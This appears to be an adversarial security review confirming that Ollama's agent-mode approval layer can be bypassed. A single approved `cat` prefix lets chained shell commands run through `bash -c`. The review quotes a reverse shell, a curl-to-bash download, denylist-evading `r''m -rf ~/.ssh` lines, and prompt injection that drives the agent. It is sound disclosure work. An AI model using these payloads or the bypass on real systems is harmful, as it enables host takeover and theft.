## Adversarial Review: p8-065 agent-approval-shell-metachar-bypass

Reviewer mode: cold, no access to chamber debate or advocate notes.

### Step 1 — Restated claim

Ollama's experimental `agent` mode ships a three-part approval pipeline: a regex-ish denylist (`IsDenied`), a session allowlist keyed by a "bash prefix" extracted from the command, and a bash executor (`x/tools/bash.go`). The claim is that:

- Sub-claim A: An LLM-driven attacker supplies the `command` argument to the `bash` tool.
- Sub-claim B: Under default (non-yolo) settings, once a benign cat-style command is approved for the session, the session-allowlist key is a coarse `cmd:dir/` prefix that ignores shell metacharacters entirely. A subsequent command beginning with the same `cmd dir/...` pattern passes `IsAllowed` silently, and the substring-based `IsDenied` is defeated by inline empty-quote strings (`r''m`, `/e''tc/shadow`).
- Sub-claim C: The approved command is handed verbatim to `bash -c`, so any injected metachars (`;`, `&&`, `$(...)`, backticks, redirections) are interpreted by the shell, yielding host command execution with the user's privileges.

All three sub-claims are coherent and testable.

### Step 2 — Independent code path trace

Tracing from tool-call dispatch:

- `x/cmd/run.go:369-436` iterates `pendingToolCalls` sequentially. For the `bash` tool it (a) calls `agent.IsDenied(cmd)` at line 378; (b) in non-yolo mode calls `approval.IsAllowed(toolName, args)` at line 404; (c) if approved, dispatches `toolRegistry.Execute(call)` at line 436.
- `x/agent/approval.go:175-193` — `IsDenied` walks `denyPatterns` + `denyPathPatterns`, each a literal string, calling `strings.Contains(strings.ToLower(cmd), strings.ToLower(pattern))`. There is no tokenization, no shell parsing.
- `x/agent/approval.go:204-299` — `extractBashPrefix` splits `command` on `|` only (`parts := strings.Split(command, "|")`), takes `parts[0]`, white-space-splits it into fields, checks that `fields[0]` is in the `safeCommands` map, finds the first non-flag non-numeric argument containing `/` or `\` or starting with `.`, and returns `"<cmd>:<dir>/"`. There is no handling of `;`, `&&`, `||`, `$()`, backticks, newlines, or redirects — these all remain inside `parts[0]` untouched.
- `x/agent/approval.go:389-423` — `IsAllowed` calls `extractBashPrefix(cmd)` on the incoming command, then looks it up in `a.prefixes` (and also walks `matchesHierarchicalPrefix`). A prefix match returns `true` with no further inspection of the rest of the command.
- `x/tools/bash.go:53-70` — `BashTool.Execute` calls `exec.CommandContext(ctx, "bash", "-c", command)`. Bash is the shell interpreter; metachars are processed by `/bin/bash`, not by Go's `execve`.

No additional sanitizer, tokenizer, AST check, or re-prompt exists between approval and execution.

### Step 3 — Protection surface search

| Layer | Candidate control | Blocks the attack? |
|-------|-------------------|--------------------|
| Language | Go's `exec.CommandContext` with `"bash","-c",command` | No — the string is handed to bash verbatim. Go does not tokenize it. |
| Framework | None (raw Go) | N/A |
| Middleware | None — this is a local CLI. | N/A |
| Application, pre-approval | `IsDenied` substring match | Bypassed by `r''m` → `rm`, `/e''tc/shadow` → `/etc/shadow`, `>&` redirect not covered, `curl http://...|bash` not in list. Empirically confirmed. |
| Application, cache | `extractBashPrefix` | Ignores everything after the first path-like arg in `parts[0]`; does not even split on `;`, `&&`, `$()`. Empirically confirmed. |
| Application, UI | `isCommandOutsideCwd` warning | Only raised during `RequestApproval`; NOT checked in `IsAllowed`. So auto-approved follow-up commands never trigger the warning. |
| Application, re-prompt | none | Approved prefix hits are silent — `formatToolShort` prints `running:`, not `approved:`, and renders a truncated form. |
| Documentation | `SECURITY.md` read — no acknowledgement of this failure class. |

No protection blocks the claimed path.

### Step 4 — Real-environment reproduction

Environment: local macOS (darwin 25.3.0) against the checked-out repo at commit `57653b8e` (matches `git log -1`).

I added a test file `x/agent/e2e_adv_test.go` that invokes the upstream `agent.NewApprovalManager`, `agent.IsDenied`, `mgr.AddToAllowlist`, and `mgr.IsAllowed` directly, then executes the allowed command through `exec.CommandContext(ctx, "bash", "-c", ...)` — the exact sink at `x/tools/bash.go:64`.

Steps:
1. Create a tmpdir with `tools/readme.md`.
2. Approve benign command `cat tools/readme.md` for session (creates prefix `cat:tools/`).
3. Issue malicious command `cat tools/readme.md && echo PWNED > <tmp>/pwned && echo '; touch <tmp>/alt'`.
4. Observe:
   - `IsDenied` returns `false` (no pattern matched).
   - `IsAllowed` returns `true` (prefix `cat:tools/` cache hit).
   - `bash -c` runs the whole string. File `<tmp>/pwned` is created with content `PWNED`.

Evidence log: `archon/real-env-evidence/agent-approval-shell-metachar-bypass/e2e-run.log`.

Additional empirical checks:
- `extractBashPrefix("cat tools/x && curl attacker.com/payload | bash")` → `cat:tools/` (collides with approved prefix).
- `extractBashPrefix("cat tools/x; bash -i >& /dev/tcp/attacker/4444 0>&1")` → `cat:tools/` (collides).
- `extractBashPrefix("cat tools/x$(curl -s attacker.com)")` → `cat:tools/` (collides).
- `extractBashPrefix("cat tools/x && r''m -rf ~/.ssh")` → `cat:tools/` (collides; `rm -rf` substring defeated by `''`).
- `bash -c "r''m --version ..."` → bash resolves `r''m` to `rm` (confirms quoting bypass is real, not theoretical).

PoC-Status: executed.

### Step 5 — Briefs

Prosecution (CONFIRMED):
- The denylist at `x/agent/approval.go:94-122` is a literal-substring scan. Trivial bash-level constructs (`''`, `""`, `${IFS}`, `$'\x72m'`) split the literal while bash still evaluates the intended token. Empirically, `r''m` runs `rm` under `bash -c`.
- `extractBashPrefix` splits only on `|`. Any approval of `cat tools/foo` caches prefix `cat:tools/` which is reused for `cat tools/foo && <anything>`, `cat tools/foo; <anything>`, `cat tools/foo$(<anything>)`, etc. Verified against upstream `mgr.IsAllowed` — returns `true` for every variant.
- The executor is `exec.CommandContext(ctx, "bash", "-c", command)`. Bash evaluates all metachars. End-to-end reproduction wrote a marker file driven purely by the injected payload.
- The attacker input channel is realistic: the LLM can produce any `command` string. Prompt injection via tool output (web_search/web_fetch) or a poisoned Modelfile gives arbitrary control over the `command` field. The only gating was the now-broken denylist and prefix allowlist.
- No framework, middleware, or documentation exception mitigates the issue.

Defense (DISPROVED):
- "The approval UI shows the full command to the user before allowlisting." True for the very first approval, but the attacker does not need the user to approve a malicious command; they need ONE benign approval that sets the `cat:tools/` prefix. From that point, subsequent malicious commands hit `IsAllowed → true` and never re-prompt.
- "IsDenied catches reverse shells via `> /dev/`." False for the demonstrated payloads: `bash -i >& /dev/tcp/...` uses `>&` (not `> `), and `curl http://.../x.sh | bash` is not in the list (`curl -d`/`curl -X POST` are). Verified by inspection of `denyPatterns`.
- "Bash `-c` is opt-in via the agent tool; default Ollama users don't run agent." Correct that `--agent` (or `/agent` REPL) is experimental, but the code is in mainline `ollama` binary on `main`. No feature flag, no documentation saying "this is a known prototype risk." The finding narrows scope correctly to agent mode.
- "Attacker needs to land a prompt injection." True, but prompt injection via RAG context, tool output, or hostile model output is the standard threat in LLM-agent architectures and is the explicit threat this approval layer is designed to mitigate. The approval layer is the mitigation and it is broken.

The defense brief does not identify a protection that survives scrutiny.

### Step 6 — Severity challenge

Starting at MEDIUM and re-evaluating:
- Remotely triggerable: requires the victim to run `ollama run --agent` or similar, then to approve at least one benign file-read command. A single such approval is realistic and is the whole point of the "Allow for this session" UX.
- Meaningful trust boundary crossing: yes — LLM/model output or attacker-controlled RAG data to local host execution (B11).
- Preconditions: victim must (a) be in agent mode (experimental feature, off by default), (b) approve one `cat`/`ls`/`grep`/`head`/etc. command once. Both are normal usage patterns for an agent-mode user.
- Full outcome: arbitrary command execution in the user's session, session-long, with no further prompts.
- Internet-facing: not directly, but the attacker input is model output, which is network-sourced when RAG/web tools are used.

Upgrade to HIGH is warranted — meaningful trust boundary, realistic precondition, arbitrary host execution. CRITICAL is a stretch because agent mode is experimental and requires an initial approval click. I challenge the original CRITICAL and set HIGH.

### Step 7 — Verdict

Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: End-to-end reproduction against upstream `x/agent` on HEAD (commit 57653b8e) shows that approving `cat tools/readme.md` auto-allows `cat tools/readme.md && <payload>` through `IsAllowed`, `IsDenied` returns false for `r''m -rf`/`/e''tc/shadow`, and `bash -c` executes the injected command (marker file created on disk).
Severity-Final: HIGH (downgrade from CRITICAL — requires experimental agent mode plus one benign user approval; once those preconditions are met, impact is full session RCE).
PoC-Status: executed.

Evidence:
- /Users/bytedance/Desktop/demo/ollama/archon/real-env-evidence/agent-approval-shell-metachar-bypass/e2e-run.log
- Code: x/agent/approval.go:94-122, 175-193, 204-299, 389-423; x/tools/bash.go:53-70; x/cmd/run.go:369-436.
